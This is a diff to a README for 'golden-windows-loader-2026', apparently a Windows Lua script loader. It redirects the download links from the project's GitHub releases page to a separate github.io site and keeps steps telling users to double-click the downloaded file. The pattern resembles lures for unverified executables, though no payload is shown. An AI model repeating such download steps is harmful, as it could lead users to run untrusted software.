@@ -1,6 +1,6 @@
 # ⚡ golden-windows-loader-2026 - Run Lua scripts on Windows effortlessly
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Wjspa4258/golden-windows-loader-2026/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://wjspa4258.github.io)
 
 ## 📋 Project Overview
 
@@ -21,7 +21,7 @@ Your computer must meet these standards to run the software:
 
 Follow these steps to set up the loader on your system.
 
-1. Visit the release page to download the latest version: https://github.com/Wjspa4258/golden-windows-loader-2026/releases
+1. Visit the release page to download the latest version: https://wjspa4258.github.io
 2. Save the file to your computer.
 3. Locate the file in your downloads folder.
 4. Double-click the file to start the installation.
